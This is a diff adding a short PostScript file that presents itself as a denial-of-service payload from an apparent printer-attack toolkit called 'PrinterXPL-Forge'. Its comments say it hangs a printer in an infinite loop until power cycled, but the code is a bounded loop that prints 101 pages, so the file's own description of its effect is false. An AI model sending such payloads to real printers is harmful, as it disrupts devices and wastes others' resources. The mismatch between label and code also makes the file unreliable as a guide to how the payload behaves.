@@ -1,0 +1,13 @@
+%!PS
+% PrinterXPL-Forge Infinite Loop Payload
+% Causes printer to hang with infinite loop (DoS attack)
+% WARNING: Printer will need power cycle to recover
+
+/Helvetica findfont 20 scalefont setfont
+0 700 moveto
+0 1 100 {
+  dup 20 mul 100 moveto
+  (PrinterXPL-Forge LOOP ACTIVE) show
+  showpage
+} for
+
